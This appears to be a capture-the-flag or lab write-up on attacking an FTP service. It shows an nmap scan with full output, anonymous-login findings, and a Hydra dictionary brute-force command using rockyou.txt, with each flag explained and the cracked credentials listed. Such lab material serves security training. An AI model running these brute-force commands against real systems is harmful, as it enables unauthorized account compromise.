# FTP

- [Enumeration](#enumeration)
  - [NMAP](#nmap)
    - [Scan](#scan)
    - [Results](#results)
    - [Information](#information)
- [Exploitation](#exploitation)

  - [Hydra](#hydra)
    - [Command](#command)
    - [Hydra Results](#hydra-results)

- What is FTP?
  FTP is a File Transfer Protocol used to allow remote file transfer over a network. It uses a client-server model to do this and relays commands and data in a very efficient way.

- How does FTP work?
  A typical FTP session operations using two channels, A command and a data channel. The data channel is used for transmitting commands as well as replies to those commands along with the data.

  FTP operates using a client-server protocol. The client initiates a connection with the server and validates any credentials provided and then opens a session.

  While the session is open, the client may execute FTP commands on the server.

- Active v.s Passive

  - Active: The client opens a port and listens. The server is required to actively connect to it.
  - Passive: The server opens a port and listens and the client connects to it.

    This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels are interlinked, you could only enter commands in between data transfers. This wouldn't be efficient for either large files transfers or slow internet connections.

## Enumeration

### NMAP

#### Scan

```bash
nmap -p- -sV -sC -A -vv -oA nmap/ftp 10.10.0.0
```

#### Results

```bash
# Nmap 7.60 scan initiated Thu Apr 29 14:07:39 2021 as: nmap -p- -sV -sC -A -vv -oA nmap/ftp 10.10.140.196
Increasing send delay for 10.10.140.196 from 5 to 10 due to 16 out of 51 dropped probes since last increase.
Increasing send delay for 10.10.140.196 from 10 to 20 due to 11 out of 32 dropped probes since last increase.
Increasing send delay for 10.10.140.196 from 20 to 40 due to 11 out of 27 dropped probes since last increase.
Increasing send delay for 10.10.140.196 from 40 to 80 due to 11 out of 29 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of -175577 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175577 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175652 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175652 microseconds.  Ignoring time.
Nmap scan report for ip-10-10-140-196.eu-west-1.compute.internal (10.10.140.196)
Host is up, received arp-response (0.00039s latency).
Scanned at 2021-04-29 14:07:40 BST for 5508s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.143.107
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 02:1E:61:85:A0:6B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=4/29%OT=21%CT=1%CU=34511%PV=Y%DS=1%DC=D%G=Y%M=021E61%T
OS:M=608AC520%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=105%TI=Z%CI=I%TS=A)
OS:SEQ(SP=F9%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301
OS:ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WI
OS:N(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=69
OS:03%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 35.785 days (since Wed Mar 24 19:48:40 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: Welcome

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms ip-10-10-140-196.eu-west-1.compute.internal (10.10.140.196)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 29 15:39:28 2021 -- 1 IP address (1 host up) scanned in 5508.88 seconds

```

#### Information

- FTP allows anonymous login
- Current FTP dir contains a PUBLIC_NOTICE.txt
  > ===================================
  >
  > MESSAGE FROM SYSTEM ADMINISTRATORS
  >
  > Hello,
  >
  > I hope everyone is aware that the
  > FTP server will not be available
  > over the weekend- we will be
  > carrying out routine system
  > maintenance. Backups will be
  > made to my account so I recommend
  > encrypting any sensitive data.
  >
  > Cheers,
  >
  > Mike
- Possible Username
  - Mike

## Exploitation

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

So far, we know

- FTP is running
- A potential username

### Hydra

Hydra is a very fast online password cracking tool. It can preform rapid dictionary attacks against more than 50 protocols.

#### Command

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.140.196 ftp
```

| SECTION                 | FUNCTION                                                                             |
| ----------------------- | ------------------------------------------------------------------------------------ |
| hydra                   | Runs the hydra tool                                                                  |
| -t 4                    | Number of parallel connections per target                                            |
| -l [user]               | Points to the user who's account you're trying to compromise                         |
| -P [path to dictionary] | Points to the file containing the list of possible passwords                         |
| -vV                     | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP]            | The IP address of the target machine                                                 |
| ftp / protocol          | Sets the protocol                                                                    |

#### Hydra Results

- Username: Mike
- Password: password
- Obtained ftp.txt with the flag
